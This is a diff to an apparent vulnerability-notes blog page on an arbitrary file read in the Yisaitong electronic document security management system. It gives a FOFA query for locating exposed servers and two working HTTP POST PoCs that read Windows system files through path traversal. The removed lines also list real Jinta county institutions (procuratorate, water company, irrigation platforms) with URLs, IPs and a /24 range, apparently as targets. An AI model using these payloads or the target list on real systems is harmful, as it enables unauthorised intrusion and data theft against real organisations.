@@ -60,36 +60,32 @@
         </header>
         <div class="prose">
           <h2 id="亿赛通-电子文档安全管理系统-文件读取">亿赛通-电子文档安全管理系统-文件读取</h2>
-          <pre><code>fofa：app=&quot;亿赛通-电子文档安全管理系统&quot; || body=&quot;/CDGServer3/index.jsp&quot;</code></pre>
+          <pre><code>
+fofa：app=&quot;亿赛通-电子文档安全管理系统&quot; || body=&quot;/CDGServer3/index.jsp&quot;
+</code></pre>
           <h2 id="漏洞复现">漏洞复现</h2>
           <p>1、访问系统</p>
           <p><img src="images/image-20250911092344970.png" alt="image-20250911092344970"></p>
           <p>2、漏洞poc</p>
-          <pre><code>poc1:
+          <pre><code>
+poc1:
+
 POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+
+
 
 command=ViewUploadFile&amp;filePath=C:/Windows/win.ini&amp;fileName1=1.png&amp;uploadFileId=1
 
+
+
 poc2
+
 POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
 
-command=ViewDecyptFile&amp;decryptFileId=../../../Windows/win.ini&amp;fileName=1.png</code></pre>
-          <p>FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDOFFNGPBCECGJNCEIELPKKCPIMCOIFKHGJFBNIKNEHICBCOCILLMJBKBENDONEMMJGCJJIFCKKECDNCAEDMCFJOCBCNLEOOGABKEGLPBNCBLEMIHABHGDLKPHDLMNFFBEFHFNGPFJGGFPEBFBFEGIFFFNGHCC</p>
-          <h2 id="金塔">金塔</h2>
-          <p>金塔县博物馆 https://jtx-museum.com/</p>
-          <p>金塔鸳鸯灌区机井管理平台  http://111.11.167.25:9002/user/login?redirect=%2F</p>
-          <p>金塔县黑河灌区信息化管理平台   http://jtgq.xmsofts.cn:8000/</p>
-          <p>金塔县人民检察院  http://www.jinta.jcy.gov.cn/</p>
-          <p>酒泉市金塔县公证处  https://jqjt.egongzheng.com/</p>
-          <p>平安金塔智管平台  https://www.jtxzfw.cn/login?redirect=%2Findex</p>
-          <p>金塔县图书馆 https://www.jttsg.org.cn/</p>
-          <p>金塔县鑫泉滴灌节水材料有限公司  https://www.slgsys.cn/</p>
-          <p>金塔县文化馆  https://jinta-szwhg.chaoxing.com/</p>
-          <p>金塔县融媒体中心 https://web-jtx.xgsyun.com/</p>
-          <p>金塔县给排水公司  http://jtzls.watercms.net/</p>
-          <p>花店  http://jinta.chinafengling.com/</p>
-          <p>金塔县招投标中心   https://jintaxianzt.qianlima.com/</p>
-          <p><strong>60.165.211.0/24</strong></p>
+
+
+command=ViewDecyptFile&amp;decryptFileId=../../../Windows/win.ini&amp;fileName=1.png
+</code></pre>
         </div>
         <footer class="article-footer">
           <a class="btn btn-ghost" href="../posts.html">返回目录</a>
